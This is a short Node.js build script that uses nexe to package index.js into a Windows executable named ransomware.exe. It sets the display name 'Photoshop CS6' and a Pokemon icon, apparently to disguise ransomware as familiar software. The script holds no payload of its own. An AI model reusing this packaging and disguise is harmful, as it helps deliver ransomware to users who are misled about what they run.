const { compile } = require("nexe");

compile({
  input: "./index.js",
  name: "Photoshop CS6",
  output: "./dist/ransomware.exe",
  target: "win32-x86-11.12.0",
  build: true,
  bundle: true,
  make: ["j4"], // instructs `make` to use 4 threads
  ico: "./static/pokemon.ico"
});
